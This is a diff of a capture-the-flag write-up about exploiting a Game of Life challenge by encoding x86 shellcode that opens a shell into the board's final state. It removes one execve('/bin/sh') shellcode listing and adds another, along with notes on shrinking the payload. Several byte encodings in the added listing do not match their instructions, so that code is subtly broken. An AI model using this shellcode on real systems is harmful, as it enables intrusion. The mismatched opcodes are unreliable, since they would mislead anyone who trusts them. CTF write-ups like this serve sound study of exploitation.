@@ -62,16 +62,16 @@ While running it locally, a `Segmentation fault (core dumped)` was reported. The
 To solve this challenge I decided to construct an initial Game of Life board such that the final board would contain assembly code that when executed would provide an interactive shell to the client. I started with the following shellcode,
 
 ```assembly
-mov    $0xb,%al       "\xb0\x0b"                    
-cltd                  "\x99"                        
-push   %edx           "\x52"                        
-push   $0x68732f2f    "\x68\x2f\x2f\x73\x68"        
-push   $0x6e69622f    "\x68\x2f\x62\x69\x6e"        
-mov    %esp,%ebx      "\x89\xe3"                    
-push   %edx           "\x52"                        
-push   %ebx           "\x53"                        
-mov    %esp,%ecx      "\x89\xe1"                    
-int    $0x80          "\xcd\x80"                    
+xor    %eax,%eax        "\x31\xC0"
+push   %eax             "\x50"
+push   $0x68732f2f      "\x68\x2F\x2F\x73\x68"
+push   $0x6e69622f      "\x68\x2F\x62\x69\x6E"
+mov    %esp,%ebx        "\x89\xDC"
+push   %eax             "\x50"
+push   %ebx             "\x53"
+mov    %esp,%ecx        "\x89\xCC"
+mov    $0xb,%al         "\xA2\x00\x00\x00\x00"
+int    $0x80            "\xCD\x80"     
 ```
 
-Due to the
+I decided to attempt to encode the shellcode using only still life constructions. This would ensure that the entire construction would remain at the end of the 15 iterations. At 22 bytes, the binary encoding of this shellcode would eventually wrap around the 110 bits of the first line of the game board. The issue with wrapping is that it complicates the intial Game of Life construction and most likely would result in destabilizing it. Therefore, I decided to try and reduce the size of the shellcode to only 13 bytes. 
